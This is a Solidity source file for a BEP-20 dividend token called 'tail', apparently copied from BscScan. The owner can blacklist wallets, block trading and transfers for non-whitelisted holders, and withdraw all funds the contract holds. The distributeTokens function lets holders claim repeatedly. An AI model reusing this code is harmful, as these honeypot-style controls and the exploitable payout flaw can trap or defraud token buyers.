/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

/**
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract tailer is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'tail';
    string private constant _symbol = 'tails';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 private _maxWalletToken = ( _totalSupply * 500 ) / 10000;
    mapping (address => bool) public isBlacklisted;
    mapping (address => bool) public isWhitelisted;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant ZERO = 0x0000000000000000000000000000000000000000;
    bool public tradingAllowed = false;
    bool public transferAllowed = true;
    bool public migrationAllowed = false;
    bool public distributeAllowed = false;
    IERC20 public migrationToken;
    IRouter internal irouter;
    address public router;
    address public pair;

    constructor() Ownable(msg.sender) {
        router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IRouter _router = IRouter(router);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        irouter = _router;
        pair = _pair;
        isWhitelisted[msg.sender] = true;
        isWhitelisted[address(this)] = true;
        setisDividendExempt(ZERO, true);
        setisDividendExempt(DEAD, true);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function enableTrading(bool enable) external onlyOwner {
        tradingAllowed = enable;
    }

    function enableTransfer(bool enable) external onlyOwner {
        transferAllowed = enable;
    }

    function enableMigration(bool enable) external onlyOwner {
        migrationAllowed = enable;
    }

    function setMigrationToken(address token) external onlyOwner {
        migrationToken = IERC20(token);
    }

    function rescueETH(uint256 amount) external onlyOwner {
        payable(msg.sender).transfer(amount);
    }

    function rescueERC20(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(msg.sender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0) && sender != address(DEAD), "ERC20: Cannot transfer from invalid addresses");
        require(amount <= balanceOf(sender),"ERC20: Cannot transfer more than balance");
        require(!isBlacklisted[sender] && !isBlacklisted[recipient], "ERC20: Wallet is Blacklisted");
        if(!isWhitelisted[sender] && !isWhitelisted[recipient]){require(transferAllowed, "ERC20: Transfering is not allowed");}
        if(sender == pair && !isWhitelisted[recipient]){require(tradingAllowed, "ERC20: Trading is not allowed");}
        if(recipient == pair && !isWhitelisted[sender]){require(tradingAllowed, "ERC20: Trading is not allowed");}
        checkMaxWallet(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        setDividendShare(sender, recipient);
    }

    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isWhitelisted[sender] && !isWhitelisted[recipient] && recipient != address(router) && recipient != address(pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "ERC20: exceeds maximum wallet amount.");}
    }

    function setMaxWallet(uint256 amount) external onlyOwner {
        _maxWalletToken = amount;
    }

    function migrateTokens() external {
        require(migrationAllowed, "ERC20: migration not enabled");
        require(balanceOf(msg.sender) > uint256(0));
        uint256 amountMigrate = balanceOf(msg.sender);
        _approve(msg.sender, address(this), amountMigrate);
        _transfer(msg.sender, address(this), amountMigrate);
        migrationToken.transfer(msg.sender, amountMigrate);
    }

    function distributeTokens() external {
        require(distributeAllowed, "ERC20: migration not enabled");
        require(balanceOf(msg.sender) > uint256(0));
        uint256 amountMigrate = balanceOf(msg.sender);
        migrationToken.transfer(msg.sender, amountMigrate);
    }

    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isContractDividendAllowed;
    address public rewards = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public currentDividends;
    uint256 internal dividendsPerShare;
    uint256 internal dividendsPerShareAccuracyFactor = 10 ** 36;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    uint256 currentIndex;
    struct Share {uint256 amount; uint256 totalExcluded; uint256 totalRealised;}

    function setisDividendExempt(address holder, bool exempt) public onlyOwner {
        isDividendExempt[holder] = exempt;
        if(exempt){processShare(holder, 0);}
        else{processShare(holder, balanceOf(holder)); }
    }

    function setisContractDividendAllowed(address holder, bool allowed) public onlyOwner {
        isContractDividendAllowed[holder] = allowed;
        if(!allowed){processShare(holder, 0);}
        else{processShare(holder, balanceOf(holder)); }
    }

    function setDividendShare(address sender, address recipient) internal {
        if(!isDividendExempt[sender]){processShare(sender, balanceOf(sender));}
        if(!isDividendExempt[recipient]){processShare(recipient, balanceOf(recipient));}
        if(isContract(sender) && !isContractDividendAllowed[sender]){processShare(sender, uint256(0));}
        if(isContract(recipient) && !isContractDividendAllowed[recipient]){processShare(recipient, uint256(0));}
    }

    function processShare(address shareholder, uint256 amount) internal {
        if(amount > uint256(0) && shares[shareholder].amount == uint256(0)){addShareholder(shareholder);}
        else if(amount == uint256(0) && shares[shareholder].amount > uint256(0)){removeShareholder(shareholder);}
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function depositToken() public onlyOwner {
        uint256 amount = IERC20(rewards).balanceOf(address(this));
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function depositETH() public onlyOwner {
        uint256 amount = address(this).balance;
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function setisBlacklisted(address[] calldata addresses, bool _bool) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
            require(addresses[i] != address(pair) && addresses[i] != address(router), "ERC20: Ineligible Addresses");
            isBlacklisted[addresses[i]] = _bool;}
    }

    function setisWhitelisted(address[] calldata addresses, bool _bool) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){isWhitelisted[addresses[i]] = _bool;}
    }

    function isContract(address addr) internal view returns (bool) {
        uint size; assembly { size := extcodesize(addr) } return size > 0; 
    }
    
    function claimToken() external {
        distributeTokenDividend(msg.sender);
    }

    function claimETH() external {
        distributeETHDividend(msg.sender);
    }

    function distributeTokenDividend(address shareholder) internal {
        if(shares[shareholder].amount == uint256(0)){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > uint256(0)){
            totalDistributed = totalDistributed.add(amount);
            IERC20(rewards).transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }

    function distributeETHDividend(address shareholder) internal {
        if(shares[shareholder].amount == uint256(0)){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > uint256(0)){
            totalDistributed = totalDistributed.add(amount);
            payable(shareholder).transfer(amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == uint256(0)){ return uint256(0); }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return uint256(0); }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) public view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function getTotalRewards(address _wallet) external view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function setRewards(address _rewards) external onlyOwner {
        rewards = _rewards;
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}